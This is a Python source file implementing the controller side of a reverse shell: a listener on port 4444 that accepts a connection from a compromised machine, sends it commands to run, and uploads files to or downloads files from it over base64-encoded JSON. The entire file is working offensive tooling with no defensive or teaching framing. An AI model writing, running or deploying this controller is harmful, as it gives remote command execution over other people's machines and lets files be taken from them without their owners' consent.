import socket
import json
import base64
import os
import threading

class ReverseShellServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection = None
        self.address = None
        
    def start_server(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(1)
            print(f"[+] Listening on {self.host}:{self.port}")
            self.connection, self.address = self.socket.accept()
            print(f"[+] Connection from {self.address}")
            self.interact()
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            if self.connection:
                self.connection.close()
            self.socket.close()
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
    
    def interact(self):
        while True:
            try:
                command = input(f"Shell> ")
                command = command.split(" ")
                
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                
                result = self.execute_remotely(command)
                
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
                
                print(result)
            except Exception as e:
                print(f"[-] Error: {e}")

if __name__ == "__main__":
    server = ReverseShellServer()
    server.start_server()
